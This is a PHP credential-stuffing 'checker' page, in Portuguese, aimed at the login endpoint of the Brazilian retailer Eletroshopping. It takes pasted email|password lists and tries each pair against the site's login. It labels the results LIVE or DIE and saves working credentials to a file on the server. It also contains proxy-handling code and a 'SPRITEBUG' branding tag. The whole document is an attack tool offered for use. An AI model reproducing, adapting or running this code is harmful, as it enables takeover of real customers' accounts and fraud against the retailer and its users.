<?php
$sock = '';
error_reporting(0);
function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}
class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url) {
        $ch = curl_init();
		global $email, $pwd , $token;
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_COOKIESESSION, true );
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/eletroshop.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/eletroshop.txt');
		curl_setopt($ch, CURLOPT_REFERER, 'https://carrinho.eletroshopping.com.br/Cliente/Login');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, 'Email='.($email).'&Senha='.($pwd));       
        }
   $data = curl_exec($ch);
        curl_close($ch);
        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url) {
        return $this->doRequest('POST', $url);
    }
}

echo '
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<head></head>
<body><center>
<style>
		</style>
    <script type="text/javascript">
        function pushPaypalDie(str){
            document.getElementById(\'listPaypalDie\').innerHTML += \'<div>\' + str + \'</div>\';
        }
        function pushPaypal(str){
            document.getElementById(\'listPaypal\').innerHTML += \'<div>\' + str + \'</div>\';
        }
        function pushWrongFormat(str){
            document.getElementById(\'listWrongFormat\').innerHTML += \'<div>\' + str + \'</div>\';
        }
    </script>
	
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">

<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>

<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="main-content">
<center><img src="img/centralbg.jpg"></center><br>
<br>
<H1><center>ELETROSHOP</h1><h4>GSCentral</h4>
<a href="logado.php" class="btn btn-link" role="button"><- Voltar</a>
<form method="post">
<div align="center"><textarea name="mp" rows="15" style="width:60%">';
if (isset($_POST['btn-submit']))
    echo $_POST['mp'];
else
    echo 'EMAIL|SENHA';
;
echo '</textarea><br /><br>
<button type="button" class="btn btn-info">Separador:</button><br></div><input type="text" name="delim" value="';

if (isset($_POST['btn-submit']))
    echo $_POST['delim'];
else
    echo '|';
;
echo '" size="1" /><input type="hidden" name="mail" value="';
if (isset($_POST['btn-submit']))
    echo $_POST['mail'];
else
    echo 0;
;
echo '" size="1" /><input type="hidden" name="pwd" value="';
if (isset($_POST['btn-submit']))
    echo $_POST['pwd'];
else
    echo 1;
;
echo '" size="1" />&nbsp;
<input type="submit" class="btn btn-success" value="CHECAR" name="submit" /> </br>&nbsp;&nbsp;&nbsp;&nbsp;
</div>
</div>
</form>
';
set_time_limit(0);
include("use.php");
function fetch_value($str, $find_start, $find_end) {
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}
function fetch_value_notrim($str, $find_start, $find_end) {
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str, $start + $length), $find_end);
    return substr($str, $start + $length, $end);
}
$dir = dirname(__FILE__);
$config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';
if (!file_exists($config['cookie_file'])) {
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
$zzz = "";
$live = array();
function get($list) {
    preg_match_all("/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/", $list, $socks);
    return $socks[0];
}
function delete_cookies() {
    global $config;
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}
function xflush() {
    static $output_handler = null;
    if ($output_handler === null) {
        $output_handler = @ini_get('output_handler');
    }
  
   if ($output_handler == 'ob_gzhandler') {
        return;
    }
	
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
        @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
        @ob_end_flush();
        @ob_start();
    }
}
function curl_grab_page($site,$proxy,$proxystatus){
	$chss = curl_init();
	curl_setopt($chss, CURLOPT_RETURNTRANSFER, TRUE);
	if ($proxystatus == 'on') {
				curl_setopt($chss, CURLOPT_SSL_VERIFYHOST, FALSE);
				curl_setopt($chss, CURLOPT_HTTPPROXYTUNNEL, TRUE);
				curl_setopt($chss, CURLOPT_PROXY, $proxy);
			}
			curl_setopt($chss, CURLOPT_COOKIEFILE, "cookie.txt");
			curl_setopt($chss, CURLOPT_URL, $site);
			return curl_exec($chss);
			curl_close ($chss);
			
}
function display($str) {
    echo '<div>' . $str . '</div>';
    xflush();
}
//function pushSockDie($str) {
   // echo '<script type="text/javascript">pushSockDie(\'' . $str . '\');</script>';
  //  xflush();
//}
function pushPaypalDie($str) {
    echo '<script type="text/javascript">pushPaypalDie(\'' . $str . '\');</script>';
	file_put_contents('api/accountsdead.txt', $str . PHP_EOL, FILE_APPEND);  
    xflush();
}
function pushPaypal($str) {
    echo '<script type="text/javascript">pushPaypal(\'' . $str . '\');</script>';
	file_put_contents('api/accounts.txt', $str . PHP_EOL, FILE_APPEND);  
    xflush();
}
function pushWrongFormat($str) {
    echo '<script type="text/javascript">pushWrongFormat(\'' . $str . '\');</script>';
    xflush();
}

if (isset($_POST['btn-submit'])) {
    
    

    ;
    echo '<br/>
<br/>

<div class="bounceIn animated">
<div class="box box-success">
                <div class="box-header">
                  <div class="alert alert-success"><small>✔ Aprovadas</small></div>
				  <i class="fa fa-spinner fa-spin" style="font-size:24px"></i> Em teste...
                </div>
                <div class="box-body">
                  <div class="box-body" id="listPaypal"  ></div>
                </div><!-- /.box-body -->
              </div>
              
<div class="box box-danger">
                <div class="box-header">
				<div class="panel panel-danger">
                  <div class="panel-heading"><small>✘ Reprovadas</small></div>
                </div>
                <div class="box-body">
                  <div class="box-body" id="listPaypalDie" ></div>
                </div><!-- /.box-body -->
              </div>
              
              <div class="box box-warning">
                <div class="box-header">
                  <i class="material-icons">warning</i><p><small>Invalidas</small></p>
                </div>
                <div class="box-body">
                  <div class="box-body" id="listWrongFormat"></div>
                </div><!-- /.box-body -->
              </div>
</div>

<br/>

<br/>


';
    xflush();
    $emails = explode("\n", trim($_POST['mp']));
    $eCount = count($emails);
    $failed = $live = $uncheck = array();
    $checked = 0;
    if (!count($emails)) {
        continue;
    }
    delete_cookies();
    //$sockClear = isSockClear();
    //if ($sockClear != 1) {
        //pushSockDie('[<font color="#FF0000">' . $sock . '</font>]');
        //continue;
    //}
    
  
    

    foreach ($emails AS $k => $line) {
        $info = explode($_POST['delim'], $line);
        $email = trim($info["{$_POST['mail']}"]);
        $pwd = trim($info["{$_POST['pwd']}"]);
        if (stripos($email, '@') === false || strlen($pwd) < 2) {
            unset($emails[$k]);
            pushWrongFormat($email . ' | ' . $pwd);
            continue;
        }
        //if ($failed[$sock] > 4)
         //   continue;
	 
	 
	 //DELETAR COOKIES
if(file_exists(getcwd().'/eletroshop.txt')) {
        unlink(getcwd().'/eletroshop.txt'); 
    }
	//FIM COOKIES
	
   
        
        
        
	//CHAMADAS DE TOKEN E POST
	$c = new cURL();
    $d = $c->post("https://carrinho.eletroshopping.com.br/Cliente/Logar");
	
$checked++;

 
	if($d){
	
	
		if (stristr($d,"true") !== false) {
			$cc = getStr($d,'"state":',',');
			$cc1 = str_replace(' \r\n','',$cc);
			$xyz = "<b style=\"color:SteelBlue\">[</b><b style=\"color:DodgerBlue\">SPRITEBUG</b><b style=\"color:SteelBlue\">]</b><b style=\"color:green\">LIVE</b> | <b style=\"color:black\" >$email</b> | <b style=\"color:black\">$pwd<b/> | ";
            $live[] = $xyz;
            unset($emails[$k]);
            pushPaypal($xyz);
			
			}
			else{
				  echo'<script type="text/javascript">catapau();</script>';
			
				pushPaypalDie("<b style=\"color:red\">DIE</b> => $sock | <b style=\"color:Gray11\" >$email<b> | $pwd ");
			unset($emails[$k]);
			
				 /* Inicio java */
            
              
                /* fim java */
			}
        
	}
	}
}
      /*           
if (isset($eCount, $live)) {

    //fimdocheck();
    display("<h3 style='text-align: center;'>Total: $eCount - Testado: $checked - Aprovado: " . count($live) . "</h3>");
 //   display(implode("<br />", $live));
}*/
    if (count($emails)) {
        //display("Sem Testar:");
       // display('<textarea cols="80" rows="10">' . implode("\n", $emails) . '</textarea>');
    }

echo '</body>
</html>';
?>




                   </div>
               
           </div>
    </div><!-- /.row -->
    </section><!-- /.content -->
    </div><!-- /.content-wrapper -->
         
    <script src="plugins/jQuery/jQuery-2.1.3.min.js"></script>
    <script src="bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
    <script src='plugins/fastclick/fastclick.min.js'></script>
    <script src="dist/js/app.min.js" type="text/javascript"></script>
    <script src="plugins/sparkline/jquery.sparkline.min.js" type="text/javascript"></script>
    <script src="plugins/jvectormap/jquery-jvectormap-1.2.2.min.js" type="text/javascript"></script>
    <script src="plugins/jvectormap/jquery-jvectormap-world-mill-en.js" type="text/javascript"></script>
    <script src="plugins/daterangepicker/daterangepicker.js" type="text/javascript"></script>
    <script src="plugins/datepicker/bootstrap-datepicker.js" type="text/javascript"></script>
    <script src="plugins/iCheck/icheck.min.js" type="text/javascript"></script>
    <script src="plugins/slimScroll/jquery.slimscroll.min.js" type="text/javascript"></script>
    <script src="plugins/chartjs/Chart.min.js" type="text/javascript"></script>
    <script src="dist/js/pages/dashboard2.js" type="text/javascript"></script>
    <script src="dist/js/demo.js" type="text/javascript"></script>
    <script type="text/javascript">
        var count = $('#cc').children().length;
        $('#quantiacc').html(count);
        var count = parseInt($('#quantiaccapos').html());
        count++;
        $('#quantiaccapos').html(count+'');
        $('#stop').attr("disabled", true);
        $("#loading").css("display", "none");
        $("#result").css("display", "none");
        $("#submit").on("click", function(){
            var texto = $.trim($('#logins').val());
            if ( texto.length > 20 ) {
                $("#result").css("display", "inline");
                $("#loading").css("display", "inline");
                $('#stop').attr("disabled", false);
                $('#submit').attr("disabled", "disabled");
            } else {
                alert("Não Há CCs ou invalido!!");
                $("#loading").css("display", "none");
                $('#stop').attr("disabled", true);
                $('#submit').attr("disabled", false);
                return false;
            }
        });
        $( "#stop" ).click(function() {
            $("#loading").css("display", "none");
            $('#stop').attr("disabled", true);
            $('#submit').attr("disabled", false);
        });
    </script>
</body>
</html>